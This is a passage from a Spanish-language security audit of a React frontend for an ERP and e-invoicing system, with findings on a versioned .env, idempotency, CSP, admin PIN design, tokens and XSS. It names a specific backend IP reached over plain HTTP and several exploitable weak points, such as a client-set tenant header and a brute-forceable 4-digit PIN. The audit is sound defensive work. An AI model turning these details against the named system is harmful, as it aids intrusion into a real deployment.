**Recommendation.** Priorizar por riesgo, no por cobertura: (1) tests unitarios de `lib/validators/dgii.ts`,
`lib/paymentLines.ts` y `lib/formatters.ts` —lógica pura, alto valor, coste bajo—; (2) tests de `storage.ts`
y `auth.store.ts` incluyendo el escenario de cambio de usuario; (3) tests de fecha con TZ fijada a
`America/Santo_Domingo` y reloj congelado a las 22:00; (4) tests de integración del interceptor de axios
(401, blob, timeout) con MSW. Añadir un workflow de CI que ejecute `tsc -b`, `eslint` y los tests en cada PR.

---

### [FE-027] `.env` versionado en git con la IP del backend

**Severity:** LOW · **Confidence:** Confirmed · **Category:** Configuration / Secrets · **Priority:** P2

`.env` **está trackeado en git** (`git ls-files` lo confirma) y no figura en `.gitignore`, que solo excluye
`*.local`. Expone `VITE_API_PROXY_TARGET=http://207.180.235.134:4000` — la dirección directa del BFF,
sin TLS.

No contiene credenciales, por lo que el impacto directo es bajo. Pero versionar `.env` es un patrón que
inevitablemente acaba filtrando un secreto cuando alguien añada uno, y **cualquier valor `VITE_*` termina
incrustado en el bundle público**: nada puesto ahí puede considerarse secreto.

`openapi.json` (842 KB) también está versionado: expone la superficie completa de la API interna del BFF.
Legítimo en un repo privado, problemático si el repositorio se abre.

**Recommendation.** Añadir `.env` a `.gitignore` y versionar `.env.example` con valores de ejemplo.
Ejecutar `git rm --cached .env`. Documentar que **ninguna variable `VITE_*` puede contener un secreto**.
Habilitar TLS en el BFF: hoy los JWT viajan en claro entre el proxy y `207.180.235.134:4000`.

---

### [FE-028] Dos lockfiles coexistiendo

**Severity:** LOW · **Confidence:** Confirmed · **Category:** Dependencies · **Priority:** P3

Coexisten `package-lock.json` (232 KB, 17-ago) y `pnpm-lock.yaml` (166 KB, 27-ago). Con fechas distintas,
describen árboles de dependencias **potencialmente divergentes**: el entorno instalado depende de qué
gestor ejecute cada persona, y de cuál use el pipeline de despliegue.

**Recommendation.** Elegir un gestor (las fechas sugieren migración a pnpm), eliminar el lockfile del otro,
declararlo en `packageManager` de `package.json` y documentarlo en el README.

---

### [FE-029] `URL.revokeObjectURL` inmediato tras `a.click()` en las descargas

**Severity:** LOW · **Confidence:** Probable · **Category:** Downloads · **Priority:** P3

Las funciones de descarga crean un `<a>`, lo activan y revocan el object URL **de forma síncrona**, sin
insertar el elemento en el DOM. En Chrome funciona; en Firefox históricamente el `click()` sobre un anchor
no adjunto al documento no dispara la descarga, y revocar inmediatamente puede cancelar una descarga en
curso.

**Location.** `src/shared/api/cobros.ts:172-177`, `src/shared/api/invoices.ts:129-135`, y patrón replicado
en ~20 funciones de descarga (`tesoreria.ts`, `reportes.ts`, `compras-gastos.ts`).

```ts
const blobUrl = URL.createObjectURL(res.data)
const a = document.createElement('a')
a.href = blobUrl; a.download = filename ?? `estado-cuenta-${customerId}.pdf`
a.click()                       // el elemento nunca se añade al DOM
URL.revokeObjectURL(blobUrl)    // revocación síncrona inmediata
```

Riesgo secundario: en `InvoiceDetail`/`CompraDetail`/`ChequeDetail`, `getPdfBlobUrl` guarda el object URL en
estado; dos clics rápidos crean dos blobs y el primero queda sin revocar — fuga de memoria por PDF.

**Recommendation.** Extraer un helper único `downloadBlob(blob, filename)` que inserte el anchor en el DOM,
lo active, lo elimine y revoque el URL dentro de un `setTimeout(..., 0)`. Revocar el object URL anterior
antes de asignar uno nuevo al estado.

---

### [FE-030] `useDirtyCheck` serializa el formulario completo en cada render

**Severity:** LOW · **Confidence:** Confirmed · **Category:** Performance · **Priority:** P3

`useDirtyCheck` ejecuta **dos `JSON.stringify` completos durante el render**, en cada render, mientras el
modal esté abierto.

```ts
// src/shared/hooks/useDirtyCheck.ts:22-23
if (!active || snapshotRef.current === undefined) return false
return JSON.stringify(values) !== JSON.stringify(snapshotRef.current)
```

En formularios con arrays de líneas, cada pulsación de tecla serializa dos veces la estructura completa.
Además, `JSON.stringify` es sensible al orden de las claves: dos objetos equivalentes con distinto orden se
consideran distintos, produciendo falsos positivos de "cambios sin guardar".

**Recommendation.** Envolver en `useMemo` dependiente de `values`, o sustituir por una comparación
superficial campo a campo. Para formularios gestionados con `react-hook-form`, usar `formState.isDirty`, que
ya está disponible y es correcto.

---

### [FE-031] `retry: 1` global amplifica la carga durante incidentes

**Severity:** LOW · **Confidence:** Confirmed · **Category:** Resilience · **Priority:** P2

`retry: 1` está configurado globalmente para todas las queries (`main.tsx:13`), lo que **duplica la carga**
contra un backend que ya está fallando. Con `KeepAlive` manteniendo 15 vistas montadas (FE-020), un
incidente de ERPNext genera el doble de peticiones desde cada cliente, justo cuando menos capacidad hay.

Además, reintentar es inútil para errores 4xx deterministas (400, 403, 404, 422): el segundo intento
fallará igual.

Algunas páginas ya usan `retry: false` puntualmente (`CustomerDetail`, `SupplierDetail`, `PermisosPage`),
lo que indica que el problema se percibió pero se resolvió caso a caso.

**Recommendation.** Sustituir por una función que no reintente errores 4xx y aplique backoff exponencial a
los 5xx:
```
retry: (count, error) => (error?.statusCode >= 400 && error?.statusCode < 500) ? false : count < 2,
retryDelay: (attempt) => Math.min(1000 * 2 ** attempt, 30_000),
```

---

### [FE-032] `X-Tenant` se envía desde `localStorage`, controlable por el cliente

**Severity:** LOW · **Confidence:** Potential · **Category:** Multi-tenancy · **Priority:** P2

El interceptor añade `X-Tenant` a cada petición leyéndolo de `localStorage`
(`client.ts:27-30` → `getTenant()`). Un usuario puede editar `gensuite:tenant:v1` en DevTools y enviar el
slug de otro tenant.

Se clasifica como **Potential** porque el impacto depende enteramente del BFF: si valida que el `X-Tenant`
recibido coincide con el tenant del JWT, el ataque no tiene efecto. Si en cambio confía en el header para
resolver el tenant, se trataría de una **vulnerabilidad crítica de acceso entre organizaciones**.

**Recommendation.** **Verificar con el equipo de NestJS** que el tenant se resuelve desde el JWT y que
`X-Tenant` se usa solo como comprobación redundante (o se ignora), rechazando con 403 cualquier
discrepancia. *Esto no es una vulnerabilidad del frontend por sí mismo si el backend valida correctamente,
pero debe confirmarse explícitamente que el backend no confía en este header.*

---

### [FE-033] Sin claves de idempotencia — riesgo de documentos duplicados

**Severity:** LOW · **Confidence:** Probable · **Category:** Data Integrity · **Priority:** P2

Ninguna mutación envía clave de idempotencia. El único mecanismo antiduplicado es deshabilitar el botón
mientras `isPending` — protección que **desaparece si la petición se pierde o expira**.

El escenario clásico: el usuario pulsa "Guardar", la petición llega al backend y se ejecuta, pero la
respuesta se pierde (red intermitente, timeout de FE-010). El frontend muestra error. El usuario reintenta.
**Se crea una segunda factura idéntica**, consumiendo un NCF adicional — un problema fiscal, ya que los NCF
son un recurso numerado y auditado ante la DGII.

`handleSubmit` de `InvoiceForm` (línea 883) tampoco tiene guarda interna `if (isSaving) return`; depende
únicamente del atributo `disabled` del botón.

**Recommendation.** Generar un `Idempotency-Key` (UUID) por intento de creación, mantenerlo estable entre
reintentos del mismo formulario y enviarlo como header; el BFF debe devolver el documento ya creado en vez
de crear otro. Requiere coordinación con backend. Como medida frontend inmediata: añadir la guarda
`if (isSaving) return` al inicio de cada `handleSubmit`, y ante un timeout mostrar el aviso de FE-010
(*"verifica si la operación se completó antes de reintentar"*) en lugar de invitar a reintentar sin más.

---

## Informational Findings

### [FE-034] La clave privada del certificado e-CF transita por el navegador

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Crypto Handling · **Priority:** P3

`EcfAdminPage` lee el archivo `.p12`/`.pfx` con `FileReader`, lo convierte a base64 en el cliente y lo envía
junto con su contraseña al BFF (`EcfAdminPage.tsx:29-38, 330-334`). Esto expone la **clave privada de firma
fiscal** y su contraseña a la memoria de JavaScript, donde quedan alcanzables por un XSS (FE-003) mientras
la operación está en curso.

Es un diseño defendible —el BFF necesita el certificado para firmar— y el propio comentario del componente
lo documenta con transparencia. Se registra por su sensibilidad: comprometer este certificado permitiría
firmar comprobantes fiscales en nombre de la empresa.

**Recommendation.** Documentar el modelo de amenaza. Confirmar que el BFF almacena el `.p12` cifrado en
reposo y que nunca lo devuelve al cliente. Considerar subida directa por `FormData` (sin conversión a
base64 en memoria) para reducir la ventana de exposición. Limpiar `password` y `file` del estado en cuanto
la mutación termine. Es un argumento adicional para priorizar TLS en el BFF (FE-027).

---

### [FE-035] Sin Content-Security-Policy ni cabeceras de seguridad

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Hardening · **Priority:** P2

`index.html` no declara CSP, y al ser una SPA estática tampoco hay cabeceras de servidor definidas en el
repositorio. Una CSP con `script-src 'self'` y `connect-src` restringido **mitigaría sustancialmente**
FE-003: aunque el XSS se ejecutara, la exfiltración del token a un dominio externo quedaría bloqueada.

Faltan asimismo `X-Frame-Options`/`frame-ancestors` (clickjacking), `X-Content-Type-Options: nosniff` y
`Referrer-Policy`.

**Recommendation.** Definir CSP en el servidor que sirve `dist/`, permitiendo los orígenes que la
aplicación realmente usa (`fonts.googleapis.com` y `fonts.gstatic.com`, referenciados en `index.html`).
Añadir `frame-ancestors 'none'`, `nosniff` y `Referrer-Policy: strict-origin-when-cross-origin`. Nota: la
CSP debe contemplar los blob URLs de la vista previa de PDF (`PdfPreviewModal` usa `<iframe src={blobUrl}>`).

---

### [FE-036] Diseño del PIN de administrador

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Auth Design · **Priority:** P3

El PIN es de **4 dígitos** (10.000 combinaciones) y se envía automáticamente al teclear el cuarto dígito o
al pegar 4 cifras, sin límite de intentos en el cliente ni retardo tras un fallo: `onError` simplemente
limpia los campos y devuelve el foco, permitiendo un nuevo intento inmediato. Un script podría agotar el
espacio de claves si el BFF no aplica rate limiting.

`PinModal.tsx:23` usa además `(res as any)?.userId`, eludiendo el tipado de la respuesta (FE-002).

**Recommendation.** Confirmar que `POST /auth/verify-admin-pin` aplica rate limiting y bloqueo por
intentos. Añadir retardo progresivo en el cliente como defensa en profundidad. Tipar `VerifyPinResponse`
correctamente y eliminar el `as any`. Considerar ampliar el PIN a 6 dígitos.

---

### [FE-037] Archivos desproporcionadamente grandes

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Maintainability · **Priority:** P3

`types.ts` (4.641 líneas, 372 interfaces), `ConfigPage.tsx` (3.217), `InvoiceDetail.tsx` (2.654),
`InvoiceForm.tsx` (1.540), `AppLayout.tsx` (1.441). `types.ts` es importado por casi toda la aplicación:
cualquier cambio invalida la compilación incremental de forma masiva y genera conflictos de merge
frecuentes en un equipo.

**Recommendation.** Dividir `types.ts` por dominio (`types/invoices.ts`, `types/compras.ts`…) con un
barrel `types/index.ts` que preserve los imports actuales — refactor mecánico y sin riesgo funcional.
Extraer subcomponentes de `ConfigPage` e `InvoiceDetail` a medida que se toquen.

---

### [FE-038] `decodeJwt` duplicado; claims del JWT usados como lógica

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Auth Design · **Priority:** P3

La función `decodeJwt` está duplicada literalmente en `src/shared/api/auth.ts:21-27` y
`src/stores/auth.store.ts:6-12`. Ambas decodifican sin verificar firma —correcto en el cliente— pero el
resultado alimenta lógica de negocio (`defaultWarehouse`, `warehouses`), no solo presentación. Véase FE-004.

**Recommendation.** Unificar en un único helper en `lib/`. Documentar explícitamente que el payload
decodificado **no es de confianza**. Obtener los almacenes de un endpoint autenticado en lugar del token.

---

### [FE-039] Sin `AbortController` ni cancelación de peticiones

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Concurrency · **Priority:** P2

No hay un solo uso de `AbortController` ni del `signal` que TanStack Query provee a `queryFn`. Las
peticiones no se cancelan al desmontar el componente ni al cambiar de filtros.

TanStack Query **sí** protege contra respuestas fuera de orden a nivel de caché (descarta los resultados de
queries obsoletas por clave), de modo que el riesgo de que una respuesta antigua sobrescriba una reciente
está mitigado **para las queries**. Lo que se pierde es la cancelación de la petición en red: el trabajo
continúa en el servidor y consume conexiones (relevante con FE-010 y FE-020).

**Recommendation.** Propagar el `signal` en las funciones de `shared/api/`:
`queryFn: ({ signal }) => listInvoices(params, { signal })`, y aceptarlo en la config de axios. Especialmente
valioso en búsquedas con debounce y en descargas de reportes pesados.

---

### [FE-040] Higiene del repositorio

**Severity:** INFO · **Confidence:** Confirmed · **Category:** Repo Hygiene · **Priority:** P3

En la raíz conviven artefactos no relacionados con el código: `asd` (1,5 KB, sin extensión), `ALTA_ORDEN`
(27 KB), `roles.md` (18 KB), `reporte-606-compras.xlsx`, `scraping-analysis/` y `scraping-analysis copy/`,
`graphify-out/`, `plan/`, `skills-lock.json`, y `dist/` con un build del 28-ago. `openapi.json` (842 KB) y
`.env` están versionados (FE-027).

Impacto nulo en seguridad, pero dificulta la navegación del proyecto y confunde sobre qué es fuente y qué
es artefacto.

**Recommendation.** Mover documentación a `docs/`, eliminar `asd` y el directorio `copy`, y confirmar que
`dist/` está efectivamente ignorado (lo está: figura en `.gitignore`).

---

## Security Analysis

**Modelo de amenaza aplicado.** El frontend está enteramente bajo control del usuario: puede modificar
JavaScript, peticiones, respuestas, `localStorage`, `sessionStorage` y parámetros, o prescindir de la UI y
llamar directamente al BFF. Bajo esa premisa, ninguna comprobación del cliente constituye un control de
seguridad; su valor es exclusivamente de experiencia de usuario.

**Lo que el frontend hace bien.** Solo existe **un** sink de HTML crudo en 85.000 líneas (FE-003), y no hay
`innerHTML`, `document.write` ni `eval`. React escapa por defecto todo el contenido interpolado, de modo que
los datos de ERPNext renderizados como texto son seguros. Hay normalización defensiva ejemplar en
`permisos.ts:38-55` (`normalizeNameList` tolera strings, `{name}` y `{value}`). Las páginas administrativas
manejan el 403 con degradación explícita, lo que confirma que la autorización real reside en el backend.

**Lo que no.** La debilidad estructural es que **el estado privilegiado y los datos sobreviven al cambio de
identidad** (FE-001, FE-002, FE-011). No es una vulnerabilidad de red ni de inyección: es un fallo de ciclo
de vida de sesión, y por eso ninguna validación del backend puede compensarlo.

**OWASP Top 10 — evaluación.**

| Categoría | Estado |
|---|---|
| A01 Broken Access Control | **Presente** — FE-002 (persistencia de privilegio), FE-009 (sin guardas de ruta) |
| A02 Cryptographic Failures | **Presente** — backend HTTP plano; JWT en `localStorage` (FE-004, FE-027) |
| A03 Injection | **Presente (limitada)** — XSS en FE-003; sin SQL/command injection (no aplica) |
| A04 Insecure Design | **Presente** — sesión sin refresh ni expiración (FE-008); PIN como identificador (FE-002) |
| A05 Security Misconfiguration | **Presente** — sin CSP (FE-035); `.env` versionado (FE-027); despliegue (FE-021) |
| A06 Vulnerable Components | **Presente (bajo)** — 7 vulnerabilidades, ninguna explotable en este contexto (FE-023) |
| A07 Auth Failures | **Presente** — sin expiración ni refresh (FE-008); PIN de 4 dígitos (FE-036) |
| A08 Data Integrity Failures | **Presente** — sin idempotencia (FE-033) |
| A09 Logging & Monitoring | **Presente** — sin telemetría de errores; `console.log` en producción (FE-022) |
| A10 SSRF | **No aplica** — no hay mecanismo cliente que induzca peticiones del servidor |
| Prototype Pollution | **No detectado** — sin merges recursivos de datos externos |
| Clickjacking | **Potencial** — sin `frame-ancestors` (FE-035) |
| CSRF | **Bajo** — autenticación por header `Bearer`, no por cookie; cambiaría si se migra a cookies (FE-004) |

---

## Authentication Analysis

El flujo es: `LoginPage` → `useAuthStore.login()` → `POST /auth/login` → `handleLoginPayload` →
`saveSession()` en `localStorage` + estado en Zustand. En arranque, `main.tsx:19` invoca `hydrate()`
**antes** de renderizar, lo que evita el parpadeo de redirección a `/login` en la recarga — un detalle bien
resuelto.

Existen además `forgotPassword`, `resetPassword` y `completeRegistration`, que envían `X-Tenant`
explícitamente porque el usuario aún no tiene sesión — decisión correcta.

**Carencias.** No hay refresh token, ni expiración proactiva, ni aviso de vencimiento, ni reintento tras
renovación (FE-008). El escenario que el encargo plantea explícitamente —tres peticiones concurrentes que
devuelven 401 y disparan un refresh— **no puede producirse porque no existe refresh**; lo que sí ocurre es
que las tres ejecutan `clearSession()` y asignan `window.location.href`, generando trabajo redundante. Si se
implementa refresh (recomendado), será imprescindible el patrón *single-flight*: una única promesa de
renovación compartida por todas las peticiones en espera, para no disparar N refrescos simultáneos ni
invalidar el token recién emitido.

`LoginPage` maneja el 429 de forma diferenciada (`isRateLimited`), y distingue los errores de tenant
(`TENANT_NOT_FOUND`, `TENANT_INACTIVE`…) con mensajes específicos. Es el único punto de la aplicación con
tratamiento explícito de 429.

---

## Authorization Analysis

La autorización real reside **por completo** en el BFF, lo cual es correcto. El frontend aporta únicamente:
`useIsSystemManager()` (lee `roles` del store) y `stripAdminOnlyEntry()` (filtra el menú lateral).

Ambos son **cosméticos y eludibles** por URL directa, por la paleta de comandos y editando `localStorage`
(FE-009, FE-004). No constituyen una vulnerabilidad *per se*, pero producen estados de UI rotos y no ofrecen
defensa en profundidad.

**Pendiente de confirmar con el equipo de NestJS** (no verificable desde este repositorio):
1. Que todos los endpoints administrativos exigen `System Manager` (FE-009).
2. Qué hace exactamente el BFF con `X-Admin-Pin` (FE-002) — **es la verificación más urgente de la lista**.
3. Que el tenant se resuelve desde el JWT y no desde `X-Tenant` (FE-032).
4. Que `defaultWarehouse`/`warehouses` se validan en servidor y no se aceptan del cliente (FE-004).

---

## Token & Session Security

| Aspecto | Estado |
|---|---|
| Almacenamiento | `localStorage`, legible por JS (FE-004) |
| Transporte | Header `Authorization: Bearer` (correcto); **sin TLS** hasta el backend (FE-027) |
| Expiración | No gestionada en cliente; `exp` nunca se lee (FE-008) |
| Refresh | **Inexistente** |
| Rotación / invalidación | Inexistente |
| Limpieza en logout | Solo 3 claves; caché, headers y borradores persisten (FE-001, FE-002, FE-011) |
| Sincronía multipestaña | Caché actualizada, UI no (FE-015) |
| Validación de datos hidratados | Ninguna: `JSON.parse` sin esquema (FE-004) |

Detalle positivo: `storage.ts:10-24` implementa una migración de claves antiguas (`gensuite_token` →
`gensuite:token:v1`) con manejo de errores, y el versionado de claves (`STORAGE_VERSION`) es una decisión
acertada que facilitará futuras migraciones.

---

## XSS Analysis

**Sinks encontrados:** uno solo — `dangerouslySetInnerHTML` en `GastoForm.tsx:655` (FE-003).
**Sinks ausentes:** `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`,
`new Function`, `setTimeout` con string. Ninguna ocurrencia.

**Fuentes analizadas:** parámetros de URL (`useParams`, 76 usos) y query params se emplean como
identificadores en peticiones, y se renderizan como texto —React los escapa—. `TabsContext:191-194`
decodifica segmentos con `decodeURIComponent` para los títulos de pestaña, pero se renderizan como texto,
no como HTML. Los datos de ERPNext se renderizan como texto salvo en el sink identificado.

**Riesgo de `<iframe src={blobUrl}>`** en `PdfPreviewModal.tsx:41`: el blob procede de una respuesta del
propio backend con `responseType: 'blob'`. Si el BFF devolviera `text/html` en lugar de `application/pdf`,
el iframe ejecutaría ese HTML en un origen `blob:` heredado del principal. Riesgo bajo (requiere que el
backend devuelva el tipo equivocado), pero conviene verificar el `Content-Type` antes de crear el object URL.

**Conclusión:** la superficie de XSS es notablemente pequeña y **se cierra casi por completo con la
corrección de una línea** en FE-003.

---

## Input Validation

`zod` está disponible y se usa en `LoginPage`, `ForgotPasswordPage` y `ResetPasswordFormPage` junto con
`react-hook-form`. Fuera de autenticación, **la mayoría de los formularios usan `useState` por campo con
validación imperativa** dentro de `handleSubmit` (mensajes vía `toast.error`), sin esquema.

Consecuencias: la validación es inconsistente entre formularios, difícil de testear, y no hay una única
fuente de verdad sobre qué es un payload válido.

`lib/validators/dgii.ts` es un punto fuerte: implementa correctamente los dígitos verificadores de RNC
(módulo 11) y Cédula (Luhn), con mensajes de error específicos y accionables. Es lógica pura, determinista
y **el primer candidato natural para tests unitarios** (FE-026).

**Campos deshabilitados que igual se envían.** `InvoiceForm.tsx:1251` renderiza el precio con `disabled`,
pero `item.rate` viaja igualmente en el payload. Es correcto arquitectónicamente (el backend debe validar el
precio), pero confirma que ningún `disabled` o `readonly` puede tratarse como control.

**Ausencias notables:** no hay límites de longitud en campos de texto libre (descripciones, notas), ni límite
de líneas por documento. Un usuario puede pegar una cadena de megabytes o añadir miles de líneas; el
navegador se degradará antes de que el backend rechace la petición.

---

## API Integration Analysis

Un único cliente axios con dos interceptores. La organización de `shared/api/` (un módulo por dominio +
`endpoints.ts` centralizado + helpers `unwrap*`) es sólida y facilita auditar la superficie de API.

**Cobertura de códigos HTTP:**

| Código | Tratamiento |
|---|---|
| 200/201/204 | `unwrap()` asume `{success, data}`. Un 204 sin cuerpo produciría `undefined` sin comprobación previa. |
| 400/422 | Se propaga `data.error`; cada pantalla lo muestra vía toast. Sin mapeo a campos de formulario. |
| 401 | `clearSession()` + redirect duro (FE-008). Excepción por subcadena `/auth/login`. |
| 403 | Sin tratamiento global. Manejado ad-hoc en `PermisosPage`, `RolesPage`, `RoleDetailPage`, `EcfAdminPage`. |
| 404 | Sin tratamiento específico; toast genérico. |
| 409 | Sin tratamiento específico — relevante para conflictos de concurrencia. |
| 429 | **Solo** en `LoginPage`. En el resto, toast genérico sin indicar que debe esperarse. |
| 500/502/503/504 | Sin distinción; mensaje del backend o `UNKNOWN_ERROR`. |
| Sin respuesta (red) | `NETWORK_ERROR` con mensaje en español — correcto. |
| Timeout | **No puede ocurrir**: no hay timeout configurado (FE-010). |
| Respuesta HTML (proxy mal configurado) | `unwrap()` accede a `.data.data` sobre un string → `undefined`, propagado a la UI como datos vacíos en lugar de error (FE-021). |

`ECF_SUBMIT_UNAVAILABLE_MSG` en `ecf.ts:25-27` es un buen ejemplo del tratamiento que merecerían más
códigos: un mensaje específico y accionable para el 503 de la DGII.

---

## ERPNext Data Flow Analysis

Los datos llegan como `ERPNext → NestJS → Frontend`. El frontend **confía en la forma** que declaran los 372
interfaces de `types.ts`, sin validación en runtime: los tipos de TypeScript se borran en compilación, de
modo que una respuesta con forma distinta se propaga sin obstáculo.

**Buenas prácticas presentes.** `permisos.ts:38-55` normaliza defensivamente (`normalizeNameList`).
`getPermisosCatalogo` usa `(res.data.data ?? {})`. El uso de `?.` y `?? []` es generalizado en el renderizado
de listas.

**Riesgos.**

- `unwrap()` (`client.ts:85-87`) hace `response.data.data` sin comprobar. Si el BFF devuelve `null`, un
  objeto sin `data`, o HTML (FE-021), el resultado es `undefined` y el fallo se manifiesta más tarde, lejos
  de su origen.
- Campos accedidos por cast fuera del tipo: `(gastoData as { message?: string }).message` (FE-003),
  `(result as any)?.updatedPrices` (`CompraDetail.tsx:83`, `CompraForm.tsx:866`),
  `(result as any).newId` (`PedidoDetail.tsx:129`), `(i as any).discountPct` (`PedidoForm.tsx:176, 233`).
  Son canales no tipados que un cambio de esquema rompería en silencio.
- **Números y monedas:** ERPNext devuelve importes como `number`. Si alguna vez llegaran como string, las
  sumas de `InvoiceForm.tsx:876-880` concatenarían en lugar de sumar, produciendo totales absurdos sin
  ningún error.
- **`null` vs `undefined`:** `formatDOP(amount?: number | null)` maneja ambos correctamente. `formatDate`
  también. Es el patrón adecuado, aplicado de forma consistente en `lib/formatters.ts`.

**Qué ocurriría con `null` o `{}`.** `unwrap` devolvería `null`/`undefined`; la mayoría de las páginas usan
`data?.items ?? []` y mostrarían un estado vacío en lugar de un error — degradación aceptable, aunque
engañosa (el usuario concluye "no hay datos" cuando en realidad hubo un fallo). Los detalles
(`InvoiceDetail`, `CompraDetail`) acceden a campos anidados y **lanzarían**, produciendo pantalla en blanco
(FE-005).

**Recomendación transversal:** validar en el borde con `zod` (ya es dependencia) al menos las respuestas de
los flujos financieros, convirtiendo un fallo silencioso en un error explícito y localizado.

---
